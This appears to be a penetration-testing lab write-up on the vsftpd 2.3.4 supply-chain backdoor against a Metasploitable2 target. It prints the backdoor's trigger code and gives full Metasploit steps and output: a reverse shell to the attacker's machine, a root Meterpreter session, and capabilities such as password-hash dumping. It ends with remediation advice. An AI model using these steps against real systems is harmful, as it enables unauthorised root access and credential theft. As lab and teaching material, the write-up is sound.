# 03 — vsftpd 2.3.4 Backdoor Exploit

## What is the vsftpd 2.3.4 Backdoor?

In 2011, an attacker compromised the official vsftpd source code and added a **hidden backdoor** before it was distributed. This is a **supply-chain attack** — the malicious code was added to the official software package (tarball) itself.

**Backdoor trigger:** If the username contains `:)` (smiley face), the FTP daemon opens a **root shell on port 6200** automatically.

---

## How the Backdoor Works

```c
// Malicious code hidden inside vsftpd 2.3.4
if (p_buf[i] == 0x3A && p_buf[i+1] == 0x29) {  // ':' and ')'
    vsf_sysutil_extra();  // Opens backdoor on port 6200
}
```

- `0x3A` = `:` (colon in hexadecimal)
- `0x29` = `)` (bracket in hexadecimal)
- Together = `:)` (smiley face)
- `vsf_sysutil_extra()` = opens root shell on port 6200

---

## CVE Details

| Field | Value |
|-------|-------|
| CVE | CVE-2011-2523 |
| CVSS Score | 10.0 (Critical) |
| Affected Version | vsftpd 2.3.4 |
| Discovery Date | 2011-07-03 |
| Type | Supply Chain Attack + Backdoor |

---

## Attack Flow

```
Attacker sends username containing ":)"
              ↓
vsftpd checks: does username contain ":)" ?
              ↓
YES → vsf_sysutil_extra() executes
              ↓
Port 6200 opens on Metasploitable2
              ↓
Attacker connects → ROOT shell granted
              ↓
Full control of target system
```

---

## Exploitation via Metasploit

### Step 1 — Launch Metasploit
```bash
msfconsole
```

### Step 2 — Search for the Exploit
```bash
search vsftpd
```

Result:
```
exploit/unix/ftp/vsftpd_234_backdoor   excellent   Backdoor Command Execution
```

### Step 3 — Load the Exploit
```bash
use 1
# or
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 4 — Verify Options
```bash
show options
```

Output:
```
RHOSTS   [empty]   yes   Target IP
RPORT    21        yes   Target port
LHOST    [empty]   yes   Kali IP
```

### Step 5 — Set Required Arguments
```bash
set RHOSTS 192.168.1.50
set LHOST 192.168.1.80
```

### Step 6 — Run the Exploit
```bash
exploit
```

### Step 7 — Confirm Root Access
```bash
getuid      # Should return: root
sysinfo     # Shows target machine details
```

---

## Actual Output

```
[*] Started reverse TCP handler on 192.168.1.80:4444
[*] 192.168.1.50:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.1.50:21 - The target appears to be vulnerable
[+] Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.1.80:4444 → 192.168.1.50:47384)

meterpreter >
```

✅ **Meterpreter session opened — full root access obtained!**

---

## What is Meterpreter?

Meterpreter is an **advanced payload** in Metasploit that gives more control than a basic shell:

| Feature | Description |
|---------|-------------|
| `getuid` | Shows current user on target |
| `sysinfo` | Full system information |
| `upload` | Upload files to target |
| `download` | Download files from target |
| `screenshot` | Take screenshot of target desktop |
| `hashdump` | Dump all password hashes |

---

## Key Findings

| Finding | Risk Level |
|---------|-----------|
| Supply chain backdoor in vsftpd 2.3.4 | 🔴 Critical |
| Root shell obtained without credentials | 🔴 Critical |
| Port 6200 exposed when triggered | 🔴 Critical |

---

## Remediation

1. **Upgrade vsftpd** to a version beyond 2.3.4
2. **Verify software checksums** (SHA256) before installing — always verify the tarball
3. **Block port 6200** at the firewall level
4. **Use intrusion detection** to catch unusual port openings
